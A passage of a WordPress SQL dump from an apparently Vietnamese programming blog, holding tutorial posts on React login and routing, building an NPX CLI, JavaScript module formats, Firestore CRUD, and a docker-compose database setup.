React.useState(\'0123456789\');\n            const [password, setPassword] = React.useState(\'123456\');\n\n            return (\n                <div>\n                    <input value={username} onChange={e => { setUsername(e.target.value) }} /> <br />\n                    <input\n                        type=\"password\" value={password}\n                        onChange={e => { setPassword(e.target.value) }}\n                    /> <br />\n                    <button onClick={e => { dispatch(api_login({ username, password })) }}>Login</button>\n                    {auth.loading && <img src=\"http://www.vitinhdaivu.com/assets/imgs/ajax-loader.gif\" width=\"18px\" />}\n                </div>\n            );\n        }\n\n        function Profile(props) {\n            const auth = ReactRedux.useSelector(state => state.auth);\n            const dispatch = ReactRedux.useDispatch();\n            React.useEffect(() => {\n                dispatch(api_getUser(auth.token.accessToken));\n            }, [])\n\n            return (\n                <div>\n                    <p>Name: {auth.loading ? <img src=\"http://www.vitinhdaivu.com/assets/imgs/ajax-loader.gif\" width=\"18px\" /> : auth.info.name}</p>\n                    <p>Phone: {auth.loading ? <img src=\"http://www.vitinhdaivu.com/assets/imgs/ajax-loader.gif\" width=\"18px\" /> : auth.info.phone}</p>\n                    <button onClick={() => { dispatch(action_logout()) }}>Logout</button>\n                </div>\n            )\n        }\n\n        function App(props) {\n            const auth = ReactRedux.useSelector(state => state.auth);\n            return (\n                // Nếu có token thì dùng token lấy thông tin, nếu không thì phải đăng nhập\n                <div>\n                    <p>Token: {JSON.stringify(auth.token, null, \'\\t\')}</p>\n                    {auth.token.accessToken ? <Profile /> : <Login />}\n                </div>\n            );\n        }\n    </script>\n\n    <!-- =========== src/index.js =========== -->\n    <script type=\"text/babel\">\n        const Provider = ReactRedux.Provider;\n        ReactDOM.render(\n            <Provider store={store}>\n                <App />\n            </Provider>,\n            document.getElementById(\'root\')\n        );\n    </script>\n</body>\n\n</html>\n</pre>', 'Demo-Authenticator: Login, Logout bằng Token', '', 'publish', 'open', 'open', '', 'demo-authenticator-login-logout-bang-token', '', '', '2021-06-30 01:00:42', '2021-06-29 18:00:42', '', 0, 'https://duycode.com/?p=1724', 0, 'post', '', 0),
(1731, 1, '2021-08-12 23:30:00', '2021-08-12 16:30:00', '** Chuẩn bị\n1. Cài đặt NodeJS: <a href=\"https://nodejs.org/en/download/\" rel=\"noopener\" target=\"_blank\">https://nodejs.org/en/download/</a>\n2. Kiểm tra version của NodeJS và NPM, sau đó tạo project\n<blockquote>\nnode -v\nnpm -v\nnpm init -y\n</blockquote>\n\n<h2>1. Cài đặt ./package.json</h2>\n<pre>\n{\n  \"name\": \"@duycode/create-fakeapi\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"bin\": {\n    \"@duycode/create-fakeapi\": \"bin/create-fakeapi\",\n    \"create-fakeapi\": \"bin/create-fakeapi\"\n  },\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\"\n}\n</pre>\nGiải thích: \n-- Bắt buộc: \"name\": tên project phải bắt đầu có chữ \"create-*\"\n-- 2 lệnh \"bin\" tương ứng\n + \"create-fakeapi\": câu lệnh CLI tại local (tại chính máy tính của mình)\n + @duycode/create-fakeapi   ==> sau này update lên npmjs thì có 2 cách chạy dòng này: \n<blockquote>\nnpm init @duycode/fakeapi   \nnpx @duycode/create-fakeapi\n</blockquote>\n-- bin/create-fakeapi: chính là nơi thực thi 2 dòng lệnh đó\n\n<h2>2. Cài đặt BIN</h2>\n-- Tạo file: ./bin/create-fakeapi (không có đuôi file, nhưng có cú pháp viết của js)\n-- Bắt buộc ở đầu file: \"#!/usr/bin/env node\"\n<pre>\n#!/usr/bin/env node\nconsole.log(\'Congratulation ! You are Ready\');\n</pre>\n\n<h2>3. Đăng ký sử dụng CLI</h2>\n-- Tại thư mục project, chạy lệnh sau:\n<blockquote>\nnpm link\n</blockquote>\n-- CLI đã được đăng ký tại 2 thư mục sau:\nC:\\Users\\duyk3\\AppData\\Roaming\\npm\nC:\\Users\\duyk3\\AppData\\Roaming\\npm\\node_modules\n\n<h2>4. Khởi chạy lần đầu</h2>\nDùng CMD tại chính folder của project\n<blockquote>\ncreate-fakeapi\n</blockquote>\n-> Kết quả: \'Congratulation ! You are Ready\'\n\n<h2>5. Sử dụng Demo</h2>\n-- Tại file: ./bin/create-fakeapi\n<pre>\n#!/usr/bin/env node\nconst { execSync } = require(\'child_process\')\n\nconst repoName = process.argv[2] || \"./\"\nconst gitURL = \'https://github.com/duyk30b/duyk30b.github.io.git\';\nconst gitCloneCommand = `git clone ${gitURL} ${repoName}`;\nconst installCommand = `cd ${repoName} && npm install`;\n\ntry {\n    execSync(gitCloneCommand);\n    execSync(installCommand);\n\n} catch (error) {\n    process.exit(-1);\n}\nconsole.log(\'Congratulation ! You are Ready :D\');\n</pre>\n\n-- Sử dụng CLI\n<blockquote>\ncreate-fakeapi newfolder\n</blockquote>\n--> kết quả: 1 folder mới đã được tạo ra từ clone github, sau đó đã tự install hoàn toàn mọi thứ :D, hay chưa\n\n<h2>6. Đưa lên npmjs</h2>\n-- Thêm vào package.json\n<pre>\n\"publishConfig\": {\n	\"access\": \"public\"\n},\n</pre>\n-- Phblish thôi (nhớ phải login trước khi publish)\n<blockquote>npm publish</blockquote>\n\n<h2>7. Sử dụng nâng cao hơn</h2>\nKhi cần nhiều options hơn, cần sử dụng thêm những thư viện sau:\n1. arg : phân tích biến đầu vào, như -v, --y, -g, --install ==> tạo options hợp lý để xử lý logic\n2. inquirer: Tạo bộ câu hỏi khi bắt đầu cài\n3. ncp : copy file \n4. execa : tạo các lệnh thực thi ngoài: như: \"git init\", \"git clone ..\"\n5. pkg-install: install các thư viện, dùng npm hoặc yarn\n6. listr: quản lý nhiệm vụ và hiển thị đẹp hơn các quá trình cài đặt ncp, execa, pkg-install\n7. chalk : console.log đẹp hơn\n\n', 'NPX - P1. Tạo CLI', '', 'publish', 'open', 'open', '', 'npx-p1-tao-cli', '', '', '2021-08-12 23:30:00', '2021-08-12 16:30:00', '', 0, 'https://duycode.com/?p=1731', 0, 'post', '', 0),
(1759, 1, '2021-05-03 01:00:17', '2021-05-02 18:00:17', '<h2>1. React v18 + ReactRouter v6</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\'en\'>\r\n\r\n<head>\r\n    <meta charset=\'UTF-8\' />\r\n    <meta http-equiv=\'X-UA-Compatible\' content=\'IE=edge\' />\r\n    <meta name=\'viewport\' content=\'width=device-width, initial-scale=1.0\' />\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\'root\'></div>\r\n    <script crossorigin src=\'https://unpkg.com/react@18/umd/react.development.js\'></script>\r\n    <script crossorigin src=\'https://unpkg.com/react-dom@18/umd/react-dom.development.js\'></script>\r\n    <script src=\'https://unpkg.com/babel-standalone@6/babel.min.js\'></script>\r\n\r\n    <!-- Load history -->\r\n    <script src=\'https://unpkg.com/history@5/umd/history.development.js\' crossorigin></script>\r\n    <!-- Load React Router and React Router DOM -->\r\n    <script src=\'https://unpkg.com/react-router@6/umd/react-router.development.js\' crossorigin></script>\r\n    <script src=\'https://unpkg.com/react-router-dom@6/umd/react-router-dom.development.js\' crossorigin></script>\r\n\r\n    <script type=\'text/babel\'>\r\n        const { useState, useEffect } = React\r\n        const { HashRouter, Routes, Route, Link, Outlet, useParams, useNavigate } = ReactRouterDOM\r\n\r\n        const Index = () => (\r\n            <div>\r\n                <Link to=\'/\'>Home</Link> |{\' \'}\r\n                <Link to=\'/products\'>Products</Link> |{\' \'}\r\n                <Link to=\'/about\'>About</Link> |{\' \'}\r\n                <Link to=\'/abcxyz\'>404</Link>\r\n                <hr />\r\n                <Outlet />\r\n            </div>\r\n        )\r\n        const Home = () => <h2>Home Page</h2>\r\n        const ProductList = () => (\r\n            <div>\r\n                <Link to=\'new\'>New</Link> |{\' \'}\r\n                <Link to=\'1\'>1</Link> |{\' \'}\r\n                <Link to=\'not\'>Not</Link>\r\n                <Outlet />\r\n            </div>\r\n        )\r\n        const ProductNew = () => <h2>Product New</h2>\r\n        const ProductItem = () => {\r\n            const params = useParams()\r\n            const navigate = useNavigate()\r\n\r\n            useEffect(() => {\r\n                if (params.productId === \'not\') navigate(\'../404\')\r\n            }, [params])\r\n            return <h2>Product Item #{params.productId}</h2>\r\n        }\r\n\r\n        const About = () => <h2>About</h2>\r\n        const NotFound = () => <h2>Not Found</h2>\r\n\r\n        const App = () => (\r\n            <HashRouter>\r\n                <Routes>\r\n                    <Route path=\'/\' element={<Index />}>\r\n                        <Route index element={<Home />} />\r\n                        <Route path=\'/products\' element={<ProductList />}>\r\n                            <Route index element={<h2>Product List</h2>} />\r\n                            <Route path=\'new\' element={<ProductNew />} />\r\n                            <Route path=\':productId\' element={<ProductItem />} />\r\n                        </Route>\r\n                        <Route path=\'/about\' element={<About />} />\r\n                        <Route path=\'*\' element={<NotFound />} />\r\n                    </Route>\r\n                </Routes>\r\n            </HashRouter>\r\n        )\r\n\r\n        const container = document.getElementById(\'root\')\r\n        ReactDOM.createRoot(container).render(<App />)\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h2>2. React v17 +  ReactRouter v5</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react-router-dom/5.2.0/react-router-dom.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { HashRouter, Link, Switch, Route } = ReactRouterDOM\r\n\r\n        const Home = () => <h2>Home</h2>\r\n        const Product = () => <h2>Product</h2>\r\n        const About = () => <h2>About</h2>\r\n        const NotFound = () => <h2>Not Found</h2>\r\n\r\n        const App = () => (\r\n            // khi sử dụng HashRouter, link url sẽ có dấu #, dạng index.html/#/router/..\r\n            <HashRouter>\r\n                <div>\r\n                    <Link to=\"/\"> Home </Link>\r\n                    <Link to=\"/product\"> Product </Link>\r\n                    <Link to=\"/about\"> About </Link>\r\n                    <Link to=\"/abcxyz\"> abcxyz </Link>\r\n                </div>\r\n                <Switch>\r\n                    <Route path=\"/\" exact component={Home} />\r\n                    <Route path=\"/product\" component={Product} />\r\n                    <Route path=\"/about\" component={About} />\r\n                    <Route component={NotFound} />\r\n                </Switch>\r\n            </HashRouter>\r\n        );\r\n\r\n        ReactDOM.render(\r\n            <App />,\r\n            document.getElementById(\'root\')\r\n        );\r\n\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n', 'React-Router: 1. Basic Router', '', 'publish', 'open', 'open', '', 'react-router-1-basic-router', '', '', '2022-07-10 22:01:52', '2022-07-10 15:01:52', '', 0, 'https://duycode.com/?p=1759', 0, 'post', '', 0),
(1784, 1, '2021-01-01 01:00:34', '2020-12-31 18:00:34', 'Các loại module của javascript:\n- IIFE: Immediately Invoked Function Expression\n- ESM Browser - Ecmascript Module\n- ESM Server - Ecmascript Module\n- CJS - CommonJS\n- AMD (cách cũ) - Asynchronous Module Definition\n- UMD - Universal Module Definition: dân chơi dùng được cả trên server lẫn trình duyệt\n\n<h2> 2. ESM Browser - Ecmascript Module </h2>\n- Sử dụng trên trình duyệt:\n- Bắt buộc khai báo phải có: type=\"module\"\n- Import thư viện khác: phải có địa chỉ cụ thể\n<pre>\n<blockquote>\n<!DOCTYPE html>\n<html lang=\"en\">\n<body>\n    <h1>Javascript Modules</h1>\n    <script type=\"importmap\">\n        { \n            \"imports\": {\n                \"vue\":        \"https://cdnjs.cloudflare.com/ajax/libs/vue/3.0.0-beta.14/vue.esm-browser.js\",\n                \"main\":        \"./main.js\"\n            }\n        }\n        </script>\n    <script type=\"module\">\n        import * as Vue from \'vue\'\n        import * as Main from \'main\'\n        import * as Vuex from \'https://cdnjs.cloudflare.com/ajax/libs/vuex/4.0.0-beta.2/vuex.esm-browser.js\'\n        import * as Compo from \'./Compo.js\'\n    </script>\n</body>\n</html>\n</blockquote>\n\n- Nếu import thư viện không có đường dẫn chính xác sẽ có lỗi\n<blockquote>\nimport React fromt \'react\'\nUncaught TypeError: Failed to resolve module specifier \"react\". Relative references must start with either \"/\", \"./\", or \"../\".\n</blockquote>\n\n- Nếu import nhầm sang thư viện của ESM server\n<blockquote>\nimport * as Vue from \'https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.esm.js\'\n--> Uncaught ReferenceError: process is not defined\n</blockquote>\n</pre>\n\n<h2>3. ESM Server </h2>\n- Trong module này thường có thêm các biến của server: process.env, ... ==> nên mới không dùng được cho browser\n- Import thư viện khi không có đường dẫn cụ thể\n<blockquote>\nimport React fromt \'react\'\n--> tự động tìm trong folder node_modules\n</blockquote>\n\n<h2>4. CJS </h2>\n- Thằng này cài trên server\n- Cú pháp khác lắm nhé\n<pre>\nconst jsonServer = require(\'json-server\')\nconst fakeData = require(\'./fake-data\')\n\nmodule.exports = {\n    data: \'123456\'\n}\n</pre>\n- Run nó bằng: \"node ./main.js\"\n\n<h2>5. UMD </h2>\n- UMD được sử dụng cả trên server lẫn client, nên cú pháp phải đáp ứng được cả 2\n- Thứ nhất: phải là cú pháp dạng IIFE\n<pre>\n(function (global, factory) {\n    if (typeof exports === \'object\' && typeof module !== \'undefined\') {\n        module.exports = factory()\n    }\n    else if (typeof define === \'function\' && define.amd) {\n        define(factory)\n    }\n    else {\n        (global = global || self, global[\"module-name\"] = factory());\n    }\n}(this, function () {\n    \'use strict\';\n}));\n</pre>\n- Thứ 2: ... chưa viết đc tiếp :D', 'JS Module - 1. Phân loại Module trong javascript', '', 'publish', 'open', 'open', '', 'js-module-1-phan-loai-module-trong-javascript', '', '', '2021-01-01 01:00:34', '2020-12-31 18:00:34', '', 0, 'https://duycode.com/?p=1784', 0, 'post', '', 0),
(1794, 1, '2021-08-10 01:00:29', '2021-08-09 18:00:29', '<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Cloud Firestore</title>\n    <style>\n        table {\n            border-collapse: collapse;\n            counter-reset: row_number 0;\n        }\n\n        tbody tr {\n            counter-increment: row_number 1;\n        }\n\n        tbody tr td:first-child::before {\n            content: counter(row_number);\n        }\n\n        th,\n        td {\n            padding: 0 0.5rem;\n            border: 1px solid black;\n        }\n    </style>\n</head>\n\n<body>\n    <div id=\"app\">\n        <input type=\"text\" placeholder=\"username\" id=\"ip_username\"><br />\n        <input type=\"text\" placeholder=\"email\" id=\"ip_email\"> <br />\n        <button onclick=\"add_user(); reset_form()\">Add User</button>\n        <button onclick=\"update_user(); reset_form()\">Update User</button>\n        <button onclick=\"replace_user(); reset_form()\">Replace User</button><br /><br />\n\n        <table>\n            <thead>\n                <tr>\n                    <th>#</th>\n                    <th>Username</th>\n                    <th>Email</th>\n                    <th>Action</th>\n                </tr>\n            </thead>\n            <tbody id=\"tbody_list\"></tbody>\n        </table>\n    </div>\n\n    <script>\n        let ip_username = document.getElementById(\"ip_username\");\n        let ip_email = document.getElementById(\"ip_email\");\n        let tbody_list = document.getElementById(\"tbody_list\");\n        let uid = null;\n\n        let create_row = (key, value) => {\n            let tr = document.createElement(\"tr\");\n            tr.innerHTML = `<td data-id=\"${key}\"></td><td>${value.username}</td><td>${value.email}</td>\n                            <td><button onClick=get_user(\"${key}\")>Sửa</button>\n                                <button onClick=delete_user(\"${key}\")>Xóa</button></td>`;\n            return tr;\n        }\n\n        let add_row_table = (key, value) => {\n            let tr = create_row(key, value);\n            tbody_list.appendChild(tr);\n        }\n\n        let redraw_table = (listUser) => {\n            tbody_list.innerHTML = \"\";\n            Object.entries(listUser).forEach(([key, value], index) => {\n                add_row_table(key, value)\n            });\n        }\n\n        const reset_form = () => {\n            ip_username.value = \"\";\n            ip_email.value = \"\";\n            uid = null;\n        }\n    </script>\n\n    <!-- Link setup firebase: https://firebase.google.com/docs/web/setup -->\n    <script src=\"https://www.gstatic.com/firebasejs/8.9.1/firebase-app.js\"></script>\n    <script src=\"https://www.gstatic.com/firebasejs/8.9.1/firebase-firestore.js\"></script>\n    <script>\n        //Nếu chỉ dùng Database Realtime, chỉ cần config: databaseURL\n        firebase.initializeApp({\n            apiKey: \'AIzaSyADcAyM-3Fb7ZJdJf86yLKFUnZmxx-QHmU\',\n            authDomain: \'duycode-77e9a.web.app\',\n            projectId: \'duycode-77e9a\'\n        });\n        const _db = firebase.firestore();\n\n        // 1. CREAD: Add new User\n        let add_user = () => {\n            let user = {\n                username: ip_username.value,\n                email: ip_email.value,\n            }\n            // Dùng add => tự động tạo document mới và đặt auto ID\n            _db.collection(\"Users\").add(user)\n                .then((docRef) => {\n                    console.log(\"Document written with: \", docRef);\n                })\n                .catch(err => { console.error(err) })\n        }\n\n        // 2. READ: \"doc(userId).get()\": chỉ đọc 1 document\n        let get_user = (userId) => {\n            _db.collection(\"Users\").doc(userId).get()\n                .then((querySnapshot) => {\n                    if (querySnapshot.exists) {\n                        ip_username.value = querySnapshot.data().username;\n                        ip_email.value = querySnapshot.data().email;\n                        uid = userId;\n                    }\n                    else console.log(\"No data available\");\n                })\n                .catch(err => { console.error(err) })\n        }\n\n        // 3. UPDATE\n        let update_user = () => {\n            let content = {\n                username: ip_username.value,\n                email: ip_email.value,\n            }\n            _db.collection(\"Users\").doc(uid).update(content)\n                .then((res) => {\n                    console.log(\"Document successfully update!\", res);\n                })\n                .catch(err => { console.error(err) })\n        }\n\n        // 4. REPLACE \n        let replace_user = () => {\n            // Dùng set => tạo mới hoặc replace chính xác vị trí đó\n            let content = {\n                username: ip_username.value,\n                email: ip_email.value,\n            }\n            _db.collection(\"Users\").doc(uid).set(content)\n                .then(res => console.log(\"Document successfully replace!\", res))\n                .catch(err => console.error(err))\n        }\n\n        //5. DELETE: Có thể dùng remove, hoặc \"set(null)\", hoặc update với \"[key]: null\"\n        let delete_user = (uid) => {\n            _db.collection(\"Users\").doc(uid).delete()\n                .then(res => console.log(\"Document successfully delete!\", res))\n                .catch(err => console.error(err))\n            // Chuyện của delete\n            // /users/J8mSwldSMsL2gAWDRZWi/id123/0UsnLdNdqdmJbMLkXUMf\n\n        }\n\n\n        // 6. READ: \"get\": Chỉ đọc database 1 lần duy nhất\n        // Như vậy 6 và 7 không nên sử dụng cùng nhau\n        _db.collection(\"Users\").get()\n            .then((querySnapshot) => {\n                const listUser = {}\n                querySnapshot.forEach((doc) => {\n                    listUser[doc.id] = doc.data();\n                });\n                // redraw_table(listUser);\n            })\n            .catch(err => { console.error(err) })\n\n\n        // 7. Event: Có thể lắng nghe các sự kiện của children khi thêm sửa xóa\n        // Khi khởi chạy, dù thằng cha có nhiều thằng con từ trước\n        // nhưng thằng \"docChanges()\" lại cứ hiểu là mới nhận về. thế mới đau\n\n        _db.collection(\"Users\").onSnapshot((snapshot) => {\n            snapshot.docChanges().forEach((change) => {\n                if (change.type === \"added\") {\n                    add_row_table(change.doc.id, change.doc.data());\n                }\n                if (change.type === \"modified\") {\n                    let new_tr = create_row(change.doc.id, change.doc.data());\n                    let td = document.querySelector(`td[data-id=\"${change.doc.id}\"]`);\n                    td.closest(\'tr\').outerHTML = new_tr.outerHTML;\n                }\n                if (change.type === \"removed\") {\n                    let td = document.querySelector(`td[data-id=\"${change.doc.id}\"]`);\n                    td.closest(\'tr\').remove();\n                }\n            });\n        });\n\n    </script>\n</body>\n\n</html>\n</pre>', 'Cloud-Firestore: 1. Basic CRUD and Listen events on change value', '', 'publish', 'open', 'open', '', 'cloud-firestore-1-basic-crud-and-listen-events-on-change-value', '', '', '2021-08-10 01:00:29', '2021-08-09 18:00:29', '', 0, 'https://duycode.com/?p=1794', 0, 'post', '', 0),
(1810, 1, '2023-06-01 01:00:18', '2023-06-01 01:00:18', '<pre>\r\nversion: \"3.3\"\r\n\r\nnetworks:\r\n  mh_network:\r\n    driver: bridge\r\n\r\nservices:\r\n  mariadb:\r\n    container_name: mhc_mariadb\r\n    image: mariadb:10.11.2\r\n    restart: unless-stopped\r\n    networks:\r\n      - mh_network\r\n    volumes:\r\n      - ./data/mariadb:/var/lib/mysql\r\n    environment:\r\n      - MARIADB_ROOT_PASSWORD=medihome2022\r\n      - MARIADB_DATABASE=mh_database\r\n      - MARIADB_USER=medihome\r\n      - MARIADB_PASSWORD=mh123456\r\n    ports:\r\n      - \"23306:3306\"\r\n\r\n  redis:\r\n    container_name: mhc_redis\r\n    image: redis:7.0.9-alpine\r\n    restart: unless-stopped\r\n    networks:\r\n      - mh_network\r\n    volumes:\r\n      - ./data/redis:/data\r\n    ports:\r\n      - \"26379:6379\"\r\n\r\n  adminer:\r\n    container_name: mhc_adminer\r\n    image: adminer:4.8.1\r\n    restart: unless-stopped\r\n    networks:\r\n      - mh_network\r\n    depends_on:\r\n      - mariadb\r\n    ports:\r\n      - 23080:8080\r\n\r\n  redis-insight:\r\n    container_name: mhc_redis-insight\r\n    image: redislabs/redisinsight:1.13.1\r\n    restart: unless-stopped\r\n    networks:\r\n      - mh_network\r\n    depends_on:\r\n      - redis\r\n    volumes:\r\n      - ./data/redis-insight:/db \r\n    ports:\r\n      - \'26301:8001\'\r\n\r\n</pre>', 'docker-compose: Database', '', 'publish', 'open', 'open', '', 'docker-compose-database', '', '', '2023-07-06 03:43:32', '2023-07-06 03:43:32', '', 0, 'https://duycode.com/?p=1810', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(1901, 1, '2021-09-24 22:31:43', '2021-09-24 15:31:43', '-- Tham khảo: <img src=\"https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/b3cdcd8d-e9af-4cc7-8bd0-9e9f3e5a9332/d1gntwe-6e8a8a71-efe4-4bea-8ef4-7d91ed7cffbb.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcL2IzY2RjZDhkLWU5YWYtNGNjNy04YmQwLTllOWYzZTVhOTMzMlwvZDFnbnR3ZS02ZThhOGE3MS1lZmU0LTRiZWEtOGVmNC03ZDkxZWQ3Y2ZmYmIucG5nIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.W90Qdr3UilrKMRpDvTnlx_o4PPmvs_WdIA0VXBhgPt8\" alt=\"\" />\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n    <style>\n        :root {\n            --baseWidth: 60px\n        }\n\n        #root {\n            display: flex;\n            flex-wrap: wrap;\n        }\n\n        .content {\n            position: relative;\n            margin: 10px;\n            width: 400px;\n            height: 400px;\n            background-color: rgb(221, 210, 210);\n        }\n\n        .circle {\n            position: absolute;\n            top: 50%;\n            left: 50%;\n            transform: translate(-50%, -50%);\n            width: calc((var(--i) + 1) * var(--baseWidth));\n            height: calc((var(--i) + 1) * var(--baseWidth));\n            border-radius: 50%;\n            overflow: hidden;\n        }\n\n        .piece {\n            position: absolute;\n            top: 50%;\n            left: 50%;\n            width: calc((var(--i) + 1) / 2 * var(--baseWidth));\n            height: calc((var(--i) + 1) / 4 * var(--baseWidth));\n            transform: rotate(calc(var(--j) * 30deg)) skewX(60deg);\n            transform-origin: 0 0;\n            background-color: var(--color);\n        }\n\n        /*  itemColor.style.transform = `rotate(${j * 30}deg) skewX(60deg)`  */\n    </style>\n</head>\n\n<body>\n    <div id=\"root\">\n        <div class=\"content gray\"></div>\n        <div class=\"content black\"></div>\n        <div class=\"content white\"></div>\n    </div>\n    <input id=\"ipColor\" type=\"color\">\n    <script>\n        const baseColor = [\'#F00\', \'#F80\', \'#FF0\', \'#8F0\', \'#0F0\', \'#0F8\', \'#0FF\', \'#08F\', \'#00F\', \'#80F\', \'#F0F\', \'#F08\']\n        const turnColor = {\n            toGrey: {\n                0: [\"8\", \"6\", \"4\", \"2\", \"0\"],\n                8: [\"8\", \"8\", \"8\", \"8\", \"8\"],\n                F: [\"8\", \"9\", \"B\", \"D\", \"F\"],\n            },\n            toWhite: {\n                0: [\"F\", \"C\", \"9\", \"6\", \"3\", \"0\"],\n                8: [\"F\", \"E\", \"D\", \"C\", \"A\", \"8\"],\n                F: [\"F\", \"F\", \"F\", \"F\", \"F\", \"F\"],\n            },\n            toBlack: {\n                0: [\"0\", \"0\", \"0\", \"0\", \"0\", \"0\"],\n                8: [\"0\", \"1\", \"2\", \"4\", \"6\", \"8\"],\n                F: [\"0\", \"3\", \"6\", \"9\", \"C\", \"F\"],\n            }\n        }\n        const listCircleGray = [],\n            listCircleWhite = [],\n            listCircleBlack = [];\n\n        //listCircleGray from 0 to 4 => to Gray\n        for (let i = 0; i < 5; i++) {\n            listCircleGray[i] = baseColor.map(base => {\n                let rgb = base.split(\'\')\n                rgb.shift()\n                let newRgb = rgb.map(item => {\n                    return turnColor.toGrey[item][i]\n                })\n                return \"#\" + newRgb.join(\'\')\n            })\n        }\n\n        //listCircleWhite from 0 to 5 => to White\n        for (let i = 0; i < 6; i++) {\n            listCircleWhite[i] = baseColor.map(base => {\n                let rgb = base.split(\'\')\n                rgb.shift()\n                let newRgb = rgb.map(item => {\n                    return turnColor.toWhite[item][i]\n                })\n                return \"#\" + newRgb.join(\'\')\n            })\n        }\n\n        //listCircleBlack from 0 to 5 => to White\n        for (let i = 0; i < 6; i++) {\n            listCircleBlack[i] = baseColor.map(base => {\n                let rgb = base.split(\'\')\n                rgb.shift()\n                let newRgb = rgb.map(item => {\n                    return turnColor.toBlack[item][i]\n                })\n                return \"#\" + newRgb.join(\'\')\n            })\n        }\n\n        console.log(listCircleGray);\n\n        const grayElement = document.querySelectorAll(\'.content.gray\')[0]\n        const blackElement = document.querySelectorAll(\'.content.black\')[0]\n        const whiteElement = document.querySelectorAll(\'.content.white\')[0]\n\n        let content_gray = \'\', content_black = \'\', content_white = \'\';\n        for (let i = 4; i >= 0; i--) {\n            let listPieceGray = \'\'\n            for (let j = 0; j < 12; j++) {\n                listPieceGray += `<div class=\"piece\" style=\"--i:${i}; --j:${j} ; --color:${listCircleGray[i][j]}\"></div>`\n            }\n            content_gray += `<div class=\"circle\" style=\"--i:${i}\">${listPieceGray}</div>`\n        }\n\n        for (let i = 5; i >= 0; i--) {\n            let listPieceBlack = \'\', listPieceWhite = \'\';\n            for (let j = 0; j < 12; j++) {\n                listPieceBlack += `<div class=\"piece\" style=\"--i:${i}; --j:${j} ; --color:${listCircleBlack[i][j]}\"></div>`\n                listPieceWhite += `<div class=\"piece\" style=\"--i:${i}; --j:${j} ; --color:${listCircleWhite[i][j]}\"></div>`\n            }\n            content_black += `<div class=\"circle\" style=\"--i:${i}\">${listPieceBlack}</div>`\n            content_white += `<div class=\"circle\" style=\"--i:${i}\">${listPieceWhite}</div>`\n        }\n\n        grayElement.innerHTML = content_gray;\n        blackElement.innerHTML = content_black;\n        whiteElement.innerHTML = content_white;\n    </script>\n</body>\n\n</html>\n</pre>', 'Bảng mã màu', '', 'publish', 'open', 'open', '', 'bang-ma-mau', '', '', '2021-09-24 22:31:43', '2021-09-24 15:31:43', '', 0, 'https://duycode.com/?p=1901', 0, 'post', '', 0),
(1952, 1, '2021-12-03 12:25:40', '2021-12-03 05:25:40', '<h2>1. index.html</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\'en\'>\r\n\r\n<head>\r\n    <meta charset=\'UTF-8\'>\r\n    <meta http-equiv=\'X-UA-Compatible\' content=\'IE=edge\'>\r\n    <meta name=\'viewport\' content=\'width=device-width, initial-scale=1.0\'>\r\n    <title>Document</title>\r\n    <link rel=\'stylesheet\' href=\'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css\' />\r\n    <link rel=\'stylesheet\' href=\'./style.css\'>\r\n    <script src=\'./functions.js\'></script>\r\n</head>\r\n\r\n<body>\r\n    <div class=\'container\'>\r\n        <div class=\'tabs\' id=\'tabs-example\'>\r\n            <div class=\'tabs-title\'>\r\n                <div class=\'tabs-prev\'>\r\n                    <div><i class=\'fas fa-chevron-left\'></i></div>\r\n                </div>\r\n                <div class=\'tabs-title-wrapper\'>\r\n                    <div class=\'tabs-title-contents\'></div>\r\n                </div>\r\n                <div class=\'tabs-next\'><i class=\'fas fa-chevron-right\'></i></div>\r\n                <div class=\'tabs-close-all\'>Close all tab</i></div>\r\n            </div>\r\n            <div class=\'tabs-panel\'></div>\r\n        </div>\r\n    